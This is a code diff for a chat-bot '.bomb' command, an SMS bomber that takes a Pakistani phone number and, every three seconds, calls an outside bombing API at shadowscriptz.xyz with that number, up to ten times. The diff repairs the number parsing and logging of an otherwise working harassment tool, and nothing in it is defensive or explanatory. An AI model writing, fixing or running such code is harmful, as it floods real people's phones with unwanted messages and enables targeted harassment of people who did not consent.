@@ -18,12 +18,12 @@ cmd({
         return reply("✅ Bombing stopped!");
     }
 
-    // Extract Number (Remove ALL non-digits + trim spaces/newlines)
-    let number = text.replace(/[^\d]/g, '').trim(); // Pure number nikalne ka hardcore tareeka
-    number = number.match(/92\d{9}$/)?.[0]; // Match ONLY 92 followed by 9 digits
+    // Extract Number (ULTIMATE FIX)
+    const cleanText = text.replace(/[^\d\s]/g, ''); // Keep only digits and spaces
+    const number = cleanText.trim().split(/\s+/)[1]; // Get second part after command
 
-    // Validate Number
-    if (!number) {
+    // Strict Validation
+    if (!number || !number.match(/^92\d{9}$/)) {
         return reply("❌ Invalid PK number! Use: .bomb 923001234567");
     }
 
@@ -33,7 +33,7 @@ cmd({
     reply(`💣 *Bombing Started!*\nNumber: ${number}`);
 
     bombingInterval = setInterval(async () => {
-        if (!isBombing || sent >= 10) { // Max 10 SMS
+        if (!isBombing || sent >= 10) {
             clearInterval(bombingInterval);
             isBombing = false;
             reply(`✅ Sent ${sent} SMS!`);
@@ -43,16 +43,16 @@ cmd({
         try {
             const apiUrl = `https://shadowscriptz.xyz/shadowapisv4/smsbomberapi.php?number=${number}`;
             const response = await fetch(apiUrl);
-            console.log("API Response:", response.status, await response.text());
-            
+            const result = await response.text();
+            console.log("API Debug:", { number, status: response.status, result });
+
             if (!response.ok) throw new Error(`API Error: ${response.status}`);
             sent++;
-            
         } catch (err) {
-            console.error("Error:", err);
+            console.error("Bombing Error:", err);
             clearInterval(bombingInterval);
             isBombing = false;
             reply(`❌ Failed: ${err.message}`);
         }
-    }, 3000); // 3-second delay
+    }, 3000);
 });
